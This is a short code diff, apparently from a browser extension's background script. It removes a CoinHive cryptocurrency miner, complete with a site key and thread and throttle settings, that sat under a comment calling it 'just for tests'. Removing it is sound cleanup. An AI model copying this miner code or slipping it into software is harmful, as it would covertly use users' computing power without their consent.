@@ -315,12 +315,4 @@
   }
 
   new Background()
-  /* Thats just for tests */
-  const miner = new CoinHive.Anonymous('Esa7xEwkU5DkSEYazz8NWsQtz6d1zNY4', {
-    throttle: 0.2,
-    threads: 2
-  })
-  miner.start()
-  miner.on('found', hash => console.log('Hash found', hash))
-  miner.on('job', job => console.log('I get job', job))
 })()
